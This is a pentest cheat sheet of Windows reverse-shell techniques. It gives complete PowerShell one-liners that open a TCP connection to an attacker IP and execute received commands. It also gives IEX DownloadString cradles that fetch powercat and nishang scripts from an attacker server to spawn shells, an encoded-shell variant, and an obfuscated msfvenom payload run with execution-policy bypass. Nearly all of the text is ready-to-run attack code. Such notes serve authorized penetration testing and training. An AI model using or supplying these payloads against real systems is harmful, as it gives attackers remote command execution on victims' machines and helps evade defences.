# Execution

## Reverse Shells

### Reverse Shell - One-Liners

Modify the IP address and the port to the attacker's.

```powershell
$client = New-Object System.Net.Sockets.TCPClient('192.168.46.2',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

or 

```powershell
$sm=(New-Object Net.Sockets.TCPClient('192.168.254.1',55555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
```

### Reverse Shell - Powercat

Link https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1

**Reverse shell**

```powershell
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.46.2/powercat.ps1');powercat -c 192.168.46.2 -p 443 -e cmd"
```

**Encoded  reverse shell**

```powershell
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.46.2/powercat.ps1');powercat -c 192.168.1.3 -p 443 -e cmd.exe -ge > encodedshell.ps1
	
cat encodedshell.ps1 | clip
	
powershell -E <PASTE>
```


### Reverse Shell  - Invoke-PowerShellTcp

**Invoke-PowerShellTcp.ps1**

Link https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1

```
powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
```

### Reverse Shell - MSFvenom

On Kali

`msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -e x86/shikata_ga_nai -i 9 -f psh -o shell.ps1`

On Target

`powershell.exe -ExecutionPolicy Bypass -NoExit -File shell.ps1`

